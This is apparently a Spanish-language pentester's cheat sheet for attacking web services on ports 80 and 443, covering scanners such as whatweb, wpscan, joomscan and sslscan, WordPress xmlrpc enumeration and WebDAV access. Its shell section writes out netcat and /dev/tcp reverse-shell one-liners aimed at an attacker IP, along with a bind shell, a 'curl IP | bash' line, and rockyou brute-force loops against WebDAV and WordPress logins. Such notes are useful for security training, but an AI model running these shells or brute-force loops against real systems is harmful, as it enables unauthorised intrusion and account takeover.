# HTTP 

Tags: #Web #Puerto #Reconocimiento #Escaneo #CMS #Comandos #HTTP #HTTPS #WordPress #Joomla #Drupal #Magento #Apache #HTTP3 

80 - Este puerto es el que se usa para la navegación web de forma no segura HTTP. 

## Codigos de estado 
* 200 -> OK
- 301 -> Moved Permanently (Follow Redirect)
- 401 -> Unauthorized
- 403 -> Forbidden
- 404 -> Not Found

## URL-Encode
* & = %26

❯ **Ctrl + u** Para ver el codigo fuente de la pagina web
❯ **Ctrl + r** Recargar la pagina web
❯ **Ctrl + Shift + c** Para inspeccionar el codigo 
❯ **Ctrl + Click-Izquierdo** Abrimos el enlace en otra pestaña


```bash
❯ whatweb ❮http://IP❯                  # Nos dara una breve descripcion del gestor de contenidos del puerto 80

	# Mirar la jQuery
	# Servidor Web
```

```bash
❯ whatweb ❮http://IP:PORT❯             # Nos dara una breve descripcion del gestor de contenidos por un puerto especifico
```

```bash
❯ whatweb ❮http://❮IP❯ -v

	# v = Miramos las cabeceras de la pagina web, las cuales aveces nos revelan cosas
```

```bash 
❯ wig ❮http://❮IP❯                     # Web Information Gathered, nos reporta las versiones de los servicios en la web
```

```bash
❯ curl ❮IP❯ | bash                     # Lo que hace Curl es obtener un index.html del servidor y despues con el bash haremos que nos interprete la data en bash
```

```bash
❯ curl -s -X GET http://❮IP❯ -I        # Miramos las cabeceras de respuesta de la pagina web 

	# I = i mayuscula
	# s = silence
```

```bash 
❯ davtest -url http://127.0.0.1 -auth admin:admin     # Debemos de tener el usuario y passwd validos para poder usar la tool

	# 1er admin = Usuario 
	# 2do admin = passwd

❯ cat /usr/share/wordlists/rockyou.txt | while read password; do response=$(davtest -url http://127.0.0.1 -auth admin:$password 2>&1 | grep -i succed); if [ $response ]; then echo "[+] La passwd correcta es: $password"; break; fi; done

# Ataque de Fuerza Bruta para encontrar la passwd con el comando davtest

❯ cadaver http://127.0.0.1     # Sirve para subir archivos, descargar contenido, etc... Debemos de tener el usaurio y passwd validos para la autenticacion 
	❯ mkdri test              # Podriamos crearnos dir en los cuales podemos colocar un recurso 
	❯ cd test 
	❯ put webdav.txt          # Podemos subir un archivo 
```

## ReverShell y BindShell
Este comando lo ejecutamos desde la pagina web para hacer una **ReverShell** : 
1) Cuando tenemos Netcat 
2) Cuando no tenemos Netcat
```bash 
❯ nc -e /bin/bash IP-Atacante 443

❯ bash -i >& /dev/tcp/IP-Atacante/443 0>&1
```

```bash
❯ nc -nlvp 443 -e /bin/bash              # Ejecutamos desde la pagina web para ponernos en escucha y hacer una **BindShell** :
```


# HTTPS 
443 - Este puerto es también para la navegación web, pero en este caso usa el protocolo HTTPS que es seguro y utiliza el protocolo TLS por debajo.

```bash
❯ openssl s_client -connect ❮IP❯:443     # Para conectarnos al openssl e inspeccionar el certificado del puerto 443
```

```bash
❯ sslscan ❮IP❯:8443                      # Te da informacion del ssl de la maquina y si detecta alguna vulnerabilidad te la representa, podemos colocar el puerto si no es el comun 443
```

# HTTP3
* HTTP3 es la próxima y tercera versión principal del Protocolo de Transferencia de Hipertexto utilizado para intercambiar información en la World Wide Web, que sucederá a HTTP/2. HTTP/3 es un borrador basado en un RFC anterior, entonces nombrado "Protocolo de Transferencia de Hipertexto sobre QUIC". 
	* Protocolo **UDP**
	* [HTTP3-QUIC](https://github.com/cloudflare/quiche)
* Para poder usar la herramienta de arriba debemos de instalar lo siguiente:
	* [Rush](https://github.com/rust-lang/rustup/issues/686)

```bash
# Ruta para poder ejecutar el http3-client /home/user/quiche/target/debug/examples

❯ ./http3-client ❮https://127.0.0.1❯
```


## WordPress Enumeracion 

Formas de **Enumerar**
* **Usuarios** que aparezcan en la pagina Web, podemos validarlos en el panel de autenticacion **Admin**

## Rutas tipicas
**/var/www/html** Ruta de Apache o Nginx
**/etc/apache2/sites-enabled/** Ruta de Apache
**/opt/blog/server.js** Ruta por default de Node.js
**/wp-login.php**    Es la ruta del panel de autenticación 
**/wp-admin.php** Es la ruta del panel de autenticación de admin
**/wp-json/wp/v2/users/** Reporta usuarios validos en la pagina de WordPress en formato Json
**/wp-content/plugins** Para ver si podemos hacer directory listing y ver los plugins existentes

**wordpress.conf**  ->   Archivo que nos muestra donde esta configurado el WordPress y se encuentra en la ruta **/etc/apache2/sites-enabled/** 
**wp-config.php**    ->   Archivo que dispone de credenciales de acceso a la base de datos, se encuentra en la ruta **/var/www/html**, a veces esta en la ruta **/usr/share/wordpress/**

```bash
❯ wpscan --url ❮http://IP/❯                               # Detecta vulnerabilidades en un wordPress
```

```bash
❯ wpscan --url <http://URL/> -e u,vp                                          # Enumeracion 

	# u = Enumerar usuarios
	# vp = Enumerar plugins vulnerables

❯ wpscan --url <http://URL/> -e u,vp --plugins-detection aggressive           # Enumeracion de plugins de manera agresiva 
	
	# plugins-detection = Enumeracion de plugins (mixed, passive, aggressive)
```

El **API Token** lo podemos descargar registrándonos desde la siguiente url:
* [API-Token](https://wpscan.com/register)

```bash
❯ wpscan --url <http://URL/> -e vp --api-token="DFFGB15GD68DG618GD81GRD"     # Enumeracion 

	# vp = Enumerar plugins vulnerables
	# api-token = Nos representa de mejor manera las vulnerabilidades con el API Token
```

```bash
❯ wpscan --url <http://IP/> -U <USER> -P /usr/share/wordlists/rockyou.txt # Fuerza bruta

	# P = Ruta del diccionario 
	# U = Usuario valido
```

```bash
❯ curl -s -X GET "http://IP/" | grep -oP 'plugins/\k[^/]+' | sort -u # Filtramos por plugins en la paggina web y ver si alguno es vulnerable, los podriamos buscar en Searchsploit

	# sort u = Quitar los resultados repetidos y dejar los 'unicos'
	# s = Modo silencioso 
```

**/xmlrpc.php** Si esta expuesto, podemos enumerar credenciales validas y solo acepta peticiones por **POST** y que este estructurada en **XML**
* Debemos de listar los metodos y lo haremos con el codigo del archivo y ver si existe el siguiente **getUsersBlogs** y despues aplicar fuerza bruta
* [Xmlrpc-Abuse](https://nitesculucian.github.io/2019/07/01/exploiting-the-xmlrpc-php-on-all-wordpress-versions/)
```bash
❯ curl -s -X POST "http://IP/xmlrpc.php" -d@file.xml

	# d@ = Indicamos el archivo que usaremos y es que esta abajo 
```

```bash
❯ nano file.xml

	<?xml version="1.0" encoding="utf-8"?> 
	<methodCall> 
	<methodName>system.listMethods</methodName> 
	<params></params> 
	</methodCall>
```


## Joomla Enumeracion 

Esta herramienta ademas de enumerar un servidor Joomla, nos crea un reporte de las vulnerabilidades que encontro.
**/administrator** Es la ruta del panel de autenticacion de admin

```bash 
❯ perl joomscan.pl -u http://IP/
```

## Drupal Enumeracion 

Esta herramienta ademas de enumerar un servidor Drupal

```bash 
❯  droopescan scan drupal --url https://IP/
```

## Magento Enumeracion 

Esta herramienta ademas de enumerar un servidor Magento
**/administration/admin/index** Es la ruta del panel de autenticacion de admin

```bash 
❯  php magescan.phar scan:all https://IP/
```